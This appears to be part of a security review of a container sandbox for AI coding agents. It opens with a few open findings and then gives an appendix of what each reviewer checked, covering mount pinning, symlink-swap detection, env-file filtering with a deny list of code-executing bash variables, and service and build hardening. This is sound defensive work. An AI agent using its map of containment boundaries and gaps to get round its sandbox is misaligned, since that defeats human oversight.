- The host-group greps accept `AI_CONTAINER_GROUP = host`, which the loader ignores, and flag a file whose first `AI_CONTAINER_GROUP=` line, the one the loader keeps, names another group.
- No test covers the greps' `export` prefix or exact match, nor the link refusal's "another group" and "leads nowhere" hints.
- The "another group" hint can name a directory that is not a valid group (`.verify-*`); "It leads nowhere" also covers a link to a file or an unsearchable directory; the "another disk" advice is printed for a link into `$HOME`, where it does not fit (it prints no command).

---

# Appendix: what each reviewer checked and cleared

## GIT


- **`git_dirs_in` discovery/pruning** — vendor/node_modules/.venv/target pruned by
  name but *not* under `*/.git/*` (so a submodule in `.git/modules` is still
  found); objects/refs/logs pruned; `.git` files/links/dirs classified correctly;
  unreadable `.git` dirs routed to the unreadable bucket. Repro confirmed a real
  `.git` is found and the pruned siblings are skipped.
- **commondir placeholder + refusal** — writes `./` (git treats as no commondir;
  libgit2 refuses `.`), refuses any other value in a real repo dir
  (`-d objects && -f config` gated, so linked-worktree dirs that legitimately
  carry a commondir do not trip it). The earlier `.` placeholder (5793a34) was
  replaced by `./` (91fac80) the *same day, before the v0.10.0 tag* — never
  released, so no upgrade false-refusal. Not a finding.
- **`config.worktree` placeholder** — created empty only when
  `extensions.worktreeConfig` is on; read back via the commondir for worktrees.
- **`_git_config_get` / `_git_config_bool`** — both prefer real `git config
  --file` (pure parse, executes nothing, triggers no fetch) with an awk fallback;
  awk bool matches git's truthiness; safe.
- **`_git_exec_keys` / `_git_include_paths`** — use `git config --file --null
  --list` / `--get-regexp`, which only parse the named file and run nothing;
  the exec-key regex and the `!`-alias / `submodule.*.update` / boolean-fsmonitor
  carve-outs match git's own "runs a program" semantics. These are *not* the
  GIT-1 vector (they never operate on live config).
- **SANDBOX_GIT_MAX** — numeric validation `^[1-9][0-9]{0,5}$`, refusal names up
  to 5 overflow dirs, every repo protected (no silent cap). `>30` NOTE fires
  correctly. Logic sound.
- **pins of the git dir** — directories from mount root down to `.git` bound
  `:rw` onto themselves so `.git` can't be renamed out (mutation 466 proves it);
  shallowest-first so a repo under an existing `:ro` overlay is skipped.
- **hooks symlink / include.path NOTE+WARNING logic** — judged after overlays via
  `_link_walk`/`_walk_exposed`/`_path_walk`, bounded to githooks(5) names; these
  are advisory warnings and are correct in intent.
- **named-group vs host-group scanning** — `_git_skip_root` set to the resolved
  group root for non-host groups and skipped in the git loop; host group is
  scanned. Matches the spec.
- **set -e hazards** — `git_dirs_in` ends `return 0`; the `mapfile < <(git …)`
  and `$(cat commondir)` substitutions are failure-tolerant; no unguarded
  failing command in the git loop that would abort the launch.

## LNCH

- `-v` parsing in `launcher_ro_overlay`:
  - `:ro` is detected among comma-separated options.
  - Named volumes and file binds are correctly ignored.
  - Sources are canonicalised with `pwd -P`.
  - Containment is compared per path component (`/x/pro` vs `/x/proj`).
  - No caller passes writable host binds via `--mount`, so `-v`-only parsing misses nothing.
- Shallowest-first ordering:
  - A pin can never land inside an existing `ro_dsts` entry, because a candidate inside one is skipped before its pins are computed.
  - Unrepresentable launchers leave nested ones to be handled, and pins through an unrepresentable name fail with them.
- Pins: every directory between the mount root and the launcher gets one, keyed by destination, so two mounts exposing the same launcher each get their own set. A move of the directory above the launcher is refused (case 455).
- Unlistable handling: the `find` predicate matches the AGENTS.md description (owner class exact for you, kernel `-r`/`-x` otherwise, agent reachability from mode bits and its single group). A mount root you cannot list refuses the launch. Identity is validated (numeric, ≤ 4294967294).
- `_bind_mount_arg` / `_mount_representable` / `_utf8_valid`:
  - CSV quoting and `""` doubling for `--mount`.
  - The `:`-only switch to `--mount`.
  - Refusal of a trailing Unicode-space or CR value via `--mount`.
  - `od`/`awk` UTF-8 validation: overlongs, surrogates, > U+10FFFF and truncated sequences all fail; ASCII and empty pass.
- `_link_walk` / `_path_walk` / `_readlink_exact` / `_walk_exposed`:
  - Kernel-style resolution: `..` is taken from the physical directory, and `^` marks the directories stepped out of.
  - The 40-link loop bound.
  - The exact target read via `readlink -n` + sentinel.
  - The home exemption that still judges the launcher's own writable inner binds.
  - Mount-point exemption only for `replace` steps.
- The symlink-on-reached-path warning works, because `script_dir` is logical (`pwd`), not physical.
- Concurrent-swap manifest:
  - A symlink swap before the manifest stat (no `-L`, so the link's own inode is recorded) or after it both produce a mismatch at the entrypoint.
  - NUL-separated records survive any destination name.
  - A failed stat records `0 0`, which fails closed.
  - The anchor and manifest come only from launcher `-e`/`-v`, never from container.env.
  - The EXIT trap also runs on SIGHUP/SIGTERM; the sweep needs both an age of over 60 min and a dead pid, never fails the launch, and cannot hit a group dir, since group names cannot start with `.`.
  - `group.sh` globs ignore `.verify-*`.
- GNU/BSD `stat` probe: done once, output validated, no fallback-on-failure.
- `verify_launcher_mounts` under `set -euo pipefail`: unreadable or missing manifest gives a NOTE, anchor mismatch gives a NOTE, entry mismatch gives `exit 1`. `tests/test-launcher-verify.sh` runs it under `-e`, and mutation 461 is killable on a preserving host.
- Tests: hermetic `tests/test-launcher-dir-ro.sh` (45 groups) and `tests/test-launcher-verify.sh` pass at HEAD. Cases 450/455/460 have paired positive controls (writable marker/root) and do not look vacuous. T38's claim is the one LNCH-1 defeats (it plants links in only one launcher).

## ENV

- `container_env_filter()` against docker's `parseKeyValueFile`: BOM on line 1 only, `unicode.IsSpace` leading trim (the uws list matches Go's White_Space set), one CR dropped by bufio, the 65535/65536 line limit, UTF-8 checked on non-comment lines (comments are dropped before docker sees them, so docker's whole-file UTF-8 failure cannot happen), `export NAME=`, whitespace in names. Every remaining divergence errs toward refusing.
- The launcher `-e` set is read from `launcher_env` itself, including conditional `${X:+-e …}` entries. `AI_CONTAINER_ENV_KEYS` and `_aice_*` are reserved. `AI_LAUNCHER_ANCHOR` set from container.env when no verify dir exists is harmless, because stash runs before `verify_launcher_mounts`.
- The held-open fd (`exec {_app_fd}< <(…)`) is inherited by docker, and there is no pipe-buffer deadlock (docker reads the file before anything else). Keys are joined with the default IFS.
- `stash_app_env()`: the `_aice_` namespace, `unset -v`, splitting without `read`, readonly names skipped. Nothing before it reads the environment except bash's own start-up, and every start-up key that executes code (BASH_ENV, SHELLOPTS, BASH_FUNC_*, PS4, ENV, POSIXLY_CORRECT, …) is denied. FUNCNEST, TMOUT, TEXTDOMAIN* and image ENV overrides (NVM_DIR etc., which no root-side script reads) were checked and are harmless.
- Every root step after the stash (link_default_ruby, link_agent_tools, firewall, daemons) runs without app env. `run_services` prepare uses `env -i`; start strips the runner's path overrides. `as_sandbox_user` and the capsh `exec env "$@" /bin/bash -l` hand-over are correctly quoted.
- Case 320 and mutations 320–322 all `git apply --check` cleanly and target the right halves. Root's environment is read from a root daemon's /proc environ, not from `docker exec`.
- `repos_path_in_container()`: path-component prefix match, resolve_path on both sides, fallback to /workspace.
- SKILL_CHAR_BUDGET / SLASH_COMMAND_TOOL_CHAR_BUDGET defaults, host override, refused from container.env through `-e`.
- CONTAINER_NAME derivation: leading-character strip, `workspace` fallback, PID suffix keeps it ≥2 characters.
- `selinux_security_opt()` and every caller: sandbox.sh, all five repo.sh seed paths (with `ensure_seed_image` before each, including `collect_inspections` and `reset_one`), `rvm_volume_ensure`, extract-discovery.sh, and verify-on-host.sh in a subshell (sourcing sandbox-common.sh prints nothing to stdout).
- `--shm-size` only when `CONTAINER_SHM_SIZE` is set or playwright is active. The `.gradle/.m2` gate is `any_has_versions` over the JVM keys. The `.yarn/.aws/.azure/.kube` gating, and `read -ra` splitting of multi-path `config_dir`.
- DOCS_PATH / ARCHITECTURE_REPO_PATH: `parse_pointer_spec` suffixes, `@name` desugar into REPOS, primary and already-mounted re-pointing.
- `load_env_defaults` parsing: set-if-unset precedence, matched-quote strip, CR tolerance.
- The hermetic tests test-env-file, test-repos-path, test-skill-char-budget, test-container-name, test-selinux-label, test-tool-config-mounts, test-architecture-path, test-host-preflight and test-sourced-guards all pass at HEAD, and each fails loudly when the launch never reaches docker.

## RT

- Python version arithmetic in `install_uv`: `minor > 0` guards x.0, 3.10 becomes 3.9, and both values are checked as numeric before use. The retry keeps the extra arguments (mkdocs `--with mkdocs-material`).
- `UV_PYTHON_INSTALL_DIR` is exported in the reconcile and in profile.d. `--no-managed-python` is on the first attempt and on the probe.
- `install_claude_native`: picks the version with `sort -V`; the EOF-read pitfall is handled; an empty versions dir (literal `*`) falls through to install; it keys on the persisted dir rather than the ephemeral launcher.
- `link-agent-tools.sh`: links only `AI_RUNTIME_TOOLS` members with an exact comma match, removes a stale link for a disabled tool, does not link a missing binary, and always exits 0. No `~/.ai-tools` bin dir is on the baked PATH. The leftover-Claude fallback is gated on claude-code.
- nvm prefix: no `.npmrc`, `prefix=` or `NPM_CONFIG_PREFIX` is baked. `npm-agent-tools` is a function. The reconcile passes `--prefix` on each npm call.
- Non-fatal claims: every entrypoint caller ends in `|| true`; the reconcile and the link scripts exit 0 on install failures; an `exec 9>` failure on the lock degrades to running without the lock rather than aborting.
- `link-node-globals.sh`: package-name parsing for scoped and unscoped packages, npm and corepack skipped, refusal to overwrite a foreign destination, the qmd wrapper's quoting, and failing the build on an unresolvable link. Its ordering after every `npm install -g` layer is tested.
- rvm-reconcile.sh: flock, re-bootstrap of a half-written rvm, literal whole-line version match, a default that is set only once and only to an installed version. /etc/profile.d/rvm.sh is OK.
- Hermetic tests test-agent-tools-reconcile / test-link-agent-tools / test-link-node-globals / test-runtime-tools-csv all pass. Mutation patches 700–760 still apply (`git apply --check`).

## PRJ

- shared-files.sh completeness: I grepped every `source`/`.`/script-dir reference and every `*.sh` name in non-comment code of every shared file. Each one resolves to a listed file or to a directory that is rsynced (tools.d, services.d, allowlist-*.d). The extra names were `runme.sh`, `project-init.sh` (version.sh uses it only as a base-repo discriminator), and false positives (install.sh, name.sh, 1.sh). repo-git-reset.sh, bash-floor.sh, host-preflight.sh and version.sh are all present. The Dockerfile COPY sources are checked by test-shared-files-parity. migrations/ is not needed in a project, because hooks run from the base repo.
- version.sh: the recorded `engine-version` takes priority over git, git is asked only when project-init.sh is present, and a stale record is removed when the version is unknown.
- sync-to-projects.sh: `conf_key_comment` (blank-line reset keeps the file header's `# schema-version` out of appended blocks; verified), the mktemp-guarded `conf_set_version`, the numeric hook ordering (`10#$nnn`), the inner `.gitignore` backfill, and that `backfill_sandbox_env` cannot pick up a shared script (none contains a literal `export IMAGE_NAME=`).
- check-sandbox-version.sh / bump-sandbox-version.sh: `comm` input is sorted consistently in the same locale; the slug and duplicate checks are sound.
- repo-git-reset.sh: primary detection order, the destructive pass failing safe on ambiguous `refname:short`, and record parsing/rendering in `reset_git` (unknown records are printed verbatim).
- repo.sh: confirmation gates for rm/reset/gc (TTY or `--yes`), the reset flow from inspect to the approved branch, SELinux option resolution before side effects, and the registry upsert/remove.
- extract-discovery.sh: the coverage matching mirrors `matches_wildcard_domain()`, deletes remove only fixed basenames, and `--clean`/`--discard` are mutually exclusive.
- migrate-runme.sh: parse_exports/parse_invocation, no-clobber backups, sourcing guard in project-init.sh (`(return 0 2>/dev/null)`).
- changelog-coverage.sh: diff against the first parent, here-string grep (no SIGPIPE), skips outside git.
- Hermetic tests run: test-repo-destructive, test-repo-registry, test-repo-git-reset, test-group-lifecycle, test-project-init, test-sync-project, test-shared-files-parity, test-extract-discovery, test-version, test-migrate-runme, test-rsync-preflight, test-report and test-check-sandbox-version all PASS under C.UTF-8. Under en_US.UTF-8 only test-repo-destructive fails (PRJ-7).

## SVC

- **Root boundary in `prepare`.** `entrypoint.sh: run_services()` runs `prepare` under `env -i` with a fixed PATH and only AI_SERVICES/SANDBOX_UID/SANDBOX_GID. AI_SERVICES comes from a launcher `-e`, which container.env cannot set. Service names are held to `NAME_RE` and must be an existing file in the image's root-owned `/etc/ai-containers/services.d`, so a crafted `sandbox.conf` value (e.g. `postgres=17,foo=bar`) cannot get root to source anything else. Every adapter default that root reads or executes in `prepare` (PG major file, lib root, socket dirs, `--version` probes) is an image path. `start` drops the runner's path overrides (`AI_SERVICES_DIR/STATE_ROOT/LOG_ROOT`) in two ways: filtered from the stash and `env -u`.
- **Injection.** `prepare` creates only image-default directories, before any agent process exists. On the SQL side, postgres identifiers are double-quoted with `"` doubled, and role/db names are held to `^[a-z_][a-z0-9_]*$`; the superuser name is quoted but not held to the pattern. MySQL user names go through `_mysql_str` (backslash and `'` escaped), passwords too, and database names are regex-held before backtick quoting. No injection found.
- **Watchdog.** `start-services.sh: run_bounded()` puts the command in its own process group, signals the group, falls back to the PID, re-KILLs the group after `wait`, and rejects `TIMEOUT=0`. `set -m` in a non-interactive shell prints no job notices (checked, with and without a tty). The only leftover is an orphaned `sleep` for at most TIMEOUT seconds per service, which is harmless. Daemonised servers (`redis --daemonize`, `mysqld --daemonize`, `mongod --fork`, pg_ctl's postmaster) are outside the group. mariadbd stays in it, which is correct: a timeout kills it.
- **Readiness.** Redis compares the INFO `process_id` with its own pid file; Redis writes the pid file only after binding. MariaDB compares `@@pid_file` with this start's path. mysqld `--daemonize`, `mongod --fork` and `pg_ctl -w` each wait on their own child. Another server cannot pass for any of them, except in the env-redirection case in SVC-1.
- **IPv6.** The `/proc/net/if_inet6` regex `^0{31}1 .* lo$` matches the kernel's format. Redis's `-::1` is optional. MySQL 8.0.13+ and MariaDB 10.11 accept comma lists in `--bind-address`. Postgres `listen_addresses='localhost'` tolerates a missing ::1. The integration listener checks use the right hex ports (1538/18EB/0CEA/8124/6989) and the right `/proc/net/tcp6` encoding of ::1.
- **Adapter contract.** All five adapters define the five functions, every `svc_provision` returns 0, and nothing outside the watchdog can block.
- **Dockerfile layers.** PGDG fails closed (`--error-on=any` plus the `apt-cache policy` check). PGDG's main component only. MySQL and MariaDB templates wait for the bootstrap server to exit before the snapshot, and MariaDB uses `--auth-root-authentication-method=normal`, so `-uroot` works as the sandbox user. The MariaDB `Release` probe and `=1:<series>.*` pin, the Mongo series probe, the major key and `mongodb-org-server=<series>.*` are correct. Mongo's list and keyring names are consistent with the db-clients=mongo layer. The SHELL is bash, so the `<<<` and the arrays are valid.
- **Build-time validation.** `build.sh: validate_config()` and `validate_server_on_off()` handle lists, case variants, leading zeros, minors and releases, and refuse mysql together with mariadb. Build args are emitted only when a key is active.
- **Runtime wiring.** `sandbox-common.sh: services_csv()` uses `is_active`. `version_matches` handles prefixes (17 does not match 170.1).
- **Tests.** All six hermetic tests pass (test-start-services, -postgres, -redis, -mysql, -mariadb, -mongo), and all 23 mutation patches for 780–814 still `git apply --check` against HEAD.
- **Restart instructions** in docs/components/*.md checked for postgres, mysql, redis and mariadb. `mysqladmin`/`mariadb-admin shutdown` wait for the pid file, and redis removes its pid file on shutdown.

## BLD

- github_token handling in the nvm, pyenv and tools layers. The credential helper keeps the token in env only (no URL rewrite). `/tmp/gh-curl.cfg` is created 0600 and removed in the same RUN; any failure path fails the build, so no layer is committed. When no `--secret` is passed the mount is empty and every path stays anonymous. A stale token falls back to an anonymous curl for the installer fetches. Neither curl nor git echoes the token into the log.
- `build.sh` exports GITHUB_TOKEN from the GITHUB_PERSONAL_ACCESS_TOKEN fallback for `--secret id=github_token,env=GITHUB_TOKEN`. `preflight_private_tools` warns correctly.
- The nvm and pyenv retry loops: clean slate per attempt (nvm `rm`+`mkdir`, pyenv `rm` only); `-o` then `bash FILE`; the `-f`/`--retry` rule (`tests/test-build-fetch-retry.sh` passes, and its checker self-tests both ways). `install_url`'s `--retry 2` satisfies the rule.
- `remove_replaced_image()`: early return on same or empty ID, inspect failure treated as gone, tag-count gate, `rmi` without `--force`. The test passes and covers each branch.
- c-toolchain / KEEP_BUILD_TOOLCHAIN: the KEEP layer reinstalls build-essential after the cleanup purge. The qmd-layer purge is gated on KEEP!=1. `make` in the utilities layer is marked manual, so `--auto-remove` keeps it. The RUBY_RUNTIME layer refuses KEEP!=1. Mutation `310-make-not-installed.patch` still applies (with offset), and case 310 asserts `make`.
- Playwright: comma and lowercase refusal, ON→latest, OFF/empty→empty arg, is_active gating of `playwright.txt`, the `NR==1` marker plus `test -s`. `tests/test-playwright.sh` passes.
- `version_list` / `has_versions` for the literal `OFF`; `sandbox.sh` uses `version_list` for RUBY_VERSIONS.
- `generate_allowlists`: every per-component fragment present in `allowlist-domains.d/` has a gate. pyenv.txt (always included) covers PyPI for mkdocs and graphify. `active_tool_fragments` deduplicates. `custom.txt` is seeded from `.example`.
- tools-lib.sh descriptor parsing (comment-strip only after whitespace, trim, reset of stale fields). `expand_placeholders` (braced only). `install_url`: zero or several matching binaries refused, query/fragment stripped before the extension test. `install_repo_file`: JSON-directory guard, empty-file guard, private anonymous fallback suppressed. Public release path with pinned and latest versions. `api_get` discards a partial body.
- `.gitattributes` (`* text=auto eol=lf`): the only tracked non-LF entries are the two instruction symlinks.
- Hermetic tests run and passing: test-tools-d, test-build-fetch-retry, test-remove-replaced-image, test-playwright, test-sandbox-schema, test-parsers.

## TST

- **run-all.sh:**
  - exit 0 is downgraded to FAIL on any `^FAIL:` line;
  - "asserted nothing" fails;
  - SKIP is reported separately;
  - SCAFFOLD-FAILED is its own channel;
  - the mktemp shim is resolved before PATH changes;
  - the developer's pointer env is unset, and test-hermetic-env.sh enforces this (it found 0 violations).
- **integration/run.sh:**
  - rc 77 means SKIP;
  - 124 means a timeout FAIL;
  - rc 0 with a FAIL: line means FAIL;
  - rc 0 with no PASS: means FAIL;
  - a variant that fails to build fails its cases by name;
  - an empty selection is fatal;
  - `--require` handles the unterminated last skip entry;
  - `--cases` naming another variant's case is a deliberate no-op in sibling nightly jobs.
  - lib.sh's `skip()` is never called after an assertion in any case.
- **lib.sh helpers:** sidecar_up and dns_up check functional readiness; sandbox_up waits for PID 1 to be uid 1000; assert_no_capability checks the decode envelope. assert_not_writable/assert_blocked have no liveness check, but the cases that use them carry positive controls (400) or matching mutations (010).
- **docker-shim.sh:** strips `--name`, rewrites `-it`, applies the verify-mount settle, and sandbox.sh has a single `--name "$container_name"`.
- **mutate.sh:** apply/rollback/revert state, the dirty-tree refusal, and the stale/unchecked distinction in check and verify. All 78 patches apply; the six spot-checked patches land on their intended code.
- **test-mutations.sh:** every tiered case has a mutation; exemptions carry reasons.
- **lib-rebuild.sh:** the COPY parser covers all 18 Dockerfile COPY lines (single-source, no flags); no patch touches allowlist fragments.
- **verify-on-host.sh:**
  - VALID_PHASES rejects stale 1/2/3;
  - every phase records failures through phase_fail;
  - the RESULT exit code is right;
  - the schema gate takes BASE_REF from merge-base origin/main, falls back to HEAD^, and refuses HEAD itself;
  - the floor container gets the SELinux option;
  - Phase 7 lints untracked files too, a superset of CI.
- **hermetic-checks.yml:**
  - every job is pinned to ubuntu-24.04;
  - the schema gate uses `pull_request.base.sha` (against the merge checkout) or `event.before`, with a HEAD^ fallback;
  - falsify gates `--max-unproven-pct 10 --max-assertless 0` and then runs `--strict`;
  - the shellcheck install is bounded and retried.
- **tests.yml and nightly.yml:**
  - the PR gate is tests.yml calling hermetic-checks.yml;
  - nightly's hermetic job is gated on schedule and asserted through wf_job_key;
  - integration.yml's push/PR branch spells out `--require security`;
  - workflow_dispatch appends `packages` to exclude.
- **test-code-references.sh:** the fixture proves all seven rules can fail; the real tree resolves cleanly.
- **test-count-idiom.sh:** no missed variants in the tree (searched for `-E -c` and `--count` forms too).
- **portability.sh:** the GNU/BSD probes are made once; `p_zombie` comm parsing is sound.
- **falsify:**
  - the verdict channels are right (timeout, signal and scaffold give UNPROVEN; SURVIVED needs no signal at all);
  - ASSERTLESS is gated at 0;
  - every survivors.txt identity is in an active target;
  - the strict ledger is green at HEAD with 0 stale and 0 obsolete entries.

## DOC

- **Key sets match.** The sandbox.conf keys match AGENTS.md (apart from DOC-13) and docs/components/README.md: every key appears in the README.
  - Every key has a matching entry in build.sh, or is handled through the tools.d/`TOOL_VERSIONS` path (dtctl, acli) or the agent-tier runtime list (mkdocs).
- **Key grammars.** These sandbox.conf comments and component docs match `validate_config`:
  - postgres, redis, mysql, mariadb, mongo, playwright, angular-cli, db-clients
  - the SDKMAN full-patch rule
  - the mysql+mariadb refusal
  - `KEEP_BUILD_TOOLCHAIN` for ruby, db-clients and c-toolchain
- **Allowlist fragments.** Every fragment that AGENTS.md and the docs name exists. The gating matches: playwright `is_active`, mongodb via db-clients, and tools.d fragments via `active_tool_fragments`. PyPI is always reachable through pyenv.txt, so mkdocs works with graphify=OFF.
- **`./sandbox.sh --help`.** Modes, `[primary]` grammar and the defaults shown all match the code:
  - `CONTAINER_*`: 1.0 / 4g / 2g / 4g / 1048576:1048576
  - `SKILL_CHAR_BUDGET` 25000, `SLASH_COMMAND_TOOL_CHAR_BUDGET` 40000
  - `IMAGE_NAME` ai-sandbox, `SANDBOX_GIT_MAX` 200, `SELINUX_LABEL` auto
  - `sandbox.sh build` gives the documented error, and `-V` prints the three version lines.
- **Subcommands and flags.** All match AGENTS.md: repo.sh, group.sh, extract-discovery.sh, ai-containers-report.sh, changelog-coverage.sh, migrate-runme.sh, bump-sandbox-version.sh, the `check-sandbox-version.sh` `BASE_REF` default, and `tests/integration/run.sh` (including `--dry-run`, `--cases`, `--variant`, and variants such as services/mariadb).
- **verify-on-host.sh.** The `PHASES` default `4 5 6 7`, `VALID_PHASES`, and run order 0,5,7,6,4 match.
- **Names AGENTS.md cites.** All exist at HEAD:
  - About 70 function names, including `container_env_filter`, `_link_walk`, `git_dirs_in`, `selinux_security_opt` and `services_csv`.
  - Env vars such as `REPO_VOLUME_PREFIX`, `AI_SERVICES_*`, `AI_LAUNCHER_ANCHOR`, `UV_PYTHON_INSTALL_DIR` and `AI_RUNTIME_TOOLS`.
  - Every test, case, mutation and workflow path it names (spot-checked 230/240/310/320/450–465/730 and 310-make-not-installed.patch).
  - The symlinks `.github/copilot-instructions.md` and `.kiro/steering/AGENTS.md`.
  - The `AI_CONTAINERS_SHARED_FILES` members, plus the tools.d/services.d copies in init and sync.
  - `tests/test-code-references.sh` passes (64 citations).
- **Internal links.** Every internal link and anchor in README, AGENTS and docs resolves, except `#sandboxconf-schema-versioning` in an old, dated CHANGELOG entry.
- **CHANGELOG.**
  - Tags v0.9.x–v0.10.7 match the section headings.
  - Each release from v0.10.0 to v0.10.7 covers its feat/fix commits.
  - Unreleased is empty, but the only changes since v0.10.7 are two test-only commits, so nothing user-facing is missing.
  - `runme.sh` takes the token from `gh` and answers `--version` before building, as the README says.
- **Component docs.** Every docs/components file except graphify.md (DOC-12) and components/README.md (DOC-11) matches its adapter and Dockerfile layer.
